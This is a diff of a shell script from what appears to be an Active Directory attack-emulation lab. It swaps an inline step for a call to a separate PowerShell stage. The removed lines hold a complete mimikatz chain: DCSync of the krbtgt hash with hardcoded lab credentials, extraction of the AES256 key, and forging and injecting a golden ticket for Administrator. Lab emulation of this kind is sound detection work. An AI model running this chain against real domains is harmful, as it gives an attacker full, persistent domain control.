@@ -8,12 +8,9 @@ T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
 echo "=== T010 | ${CASE_ID} | T0=${T0} ==="
 
 ws01_ensure_mimikatz
-
-# Domain SID cadre.local from live lab
-DOMAIN_SID="S-1-5-21-277764030-1371232215-1561074416"
-
-ws01_exec_as analyst_t1 'T13r_An@lyst!' \
-  "C:\\Tools\\cadre-attack\\mimikatz.exe \"lsadump::dcsync /domain:cadre.local /user:CN=krbtgt,CN=Users,DC=cadre,DC=local /dc:dc01.cadre.local /authuser:chief_command /authpassword:C0mm@nd_Ch1ef! /authdomain:cadre.local\" exit 2>&1 | Tee-Object C:\\Tools\\cadre-attack\\dcsync-out.txt; \$aes=(Select-String -Path C:\\Tools\\cadre-attack\\dcsync-out.txt -Pattern 'aes256_hmac\\s+\\(4096\\)\\s+:\\s+(.+)' | Select-Object -First 1).Matches.Groups[1].Value.Trim(); Write-Output \"AES256=\$aes\"; C:\\Tools\\cadre-attack\\mimikatz.exe \"kerberos::golden /user:Administrator /domain:cadre.local /sid:${DOMAIN_SID} /aes256:\$aes /ptt\" \"misc::cmd cmd.exe /c whoami\" exit"
+OUT="$(campaign_stage_run_ps1 analyst_t1 'T13r_An@lyst!' campaign-a-t010-golden.ps1)"
+printf '%s\n' "${OUT}"
+campaign_require_ok T010 "${OUT}" 'T010_OK'
 
 cadre_export "${CASE_ID}" T010 "${T0}" 192.168.77.62
 echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
